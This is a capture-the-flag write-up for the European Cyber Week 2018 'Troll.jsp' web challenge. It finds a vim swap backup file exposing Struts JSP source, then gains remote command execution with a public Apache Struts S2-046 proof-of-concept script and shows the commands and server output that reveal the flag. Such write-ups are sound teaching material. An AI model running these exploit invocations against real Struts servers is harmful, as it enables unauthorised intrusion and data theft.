# [European Cyber Week] - Troll.jsp



## State of the art

A marvelous Java website, I looooove Java (joke.), so the flag appears to have been stolen:


![](/lib/images/writeups/2018_ecw/trolljsp/troll_1.png)


I had to guess the `flag.jsp` page:


![](/lib/images/writeups/2018_ecw/trolljsp/troll_2.png)


On `md5decrypt.net`, this hash gives us: `swp`, it looks like a backup file of vim. Let's try something like `.flag.jsp.swp`.

## Backup file

Oh, looks like we have the code of the `flag.jsp` page:

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ taglib prefix = "s" uri = "/struts-tags" %>

<html>
   <head>
      <title>Flag page!</title>
   </head>
   <body>
<!--TODO change the flag -->
   <s:set var='flag' value='%{"ECW{2f3f3238f9a5783fe4767d77e53aaf3b}"}'/>
   <s:set var='trollFlag' value='%{"ECW{a9ec6fc4217038a6f91294b8e5ed9933}"}'/>

   <s:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/>
<p>
      Congratz! You got a flag: <s:property value = "result"/>
</p>
   </body>
</html>
```

The new hash is still a fake flag. On `md5decrypt`, it gives us __equifax__.

> https://www.zdnet.fr/actualites/faille-apache-struts-equifax-veut-noyer-le-poisson-39857358.htm

Well, it's an Apache struts vulnerability. There are a lot of GitHub repositories exploiting this vulnerability, here is one of them: https://github.com/jas502n/st2-046-poc

## Exploitation

I just execute the GitHub script:

```bash
$ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'find . -ls | grep flag'
[...]
  6556060     12 -rw-r-----   1 tomcat   tomcat      11530 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.class
  6556061     16 -rw-r-----   1 tomcat   tomcat      16046 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.java
  6556025      4 -rwxr-xr-x   1 root     root         2249 Aug 22 13:35 ./opt/tomcat/webapps/ECW/flag.jsp
  6556001      4 -rwxr-xr-x   1 root     root          556 Aug 22 13:34 ./opt/tomcat/webapps/ECW/.flag.jsp.swp
[...]

$ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'cat ./opt/tomcat/webapps/ECW/flag.jsp'
[...]
              </a>
            </li>
          </ul>
        </div>
      </div>
    </nav><s:set var='flag' value='%{"ECW{babde20f76698360d6f1a500b821e797}"}'/><s:set var='trollFlag' value='%{"ECW{a9ec6fc4217038a6f91294b8e5ed9933}"}'/><s:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/>
    <div class="container">
      <div class="row">
        <div class="col-lg-12 text-center">
			<p class="lead">Now that's a flag! <s:property value = "result"/></p>
[...]
```

## Flag

> ECW{babde20f76698360d6f1a500b821e797}
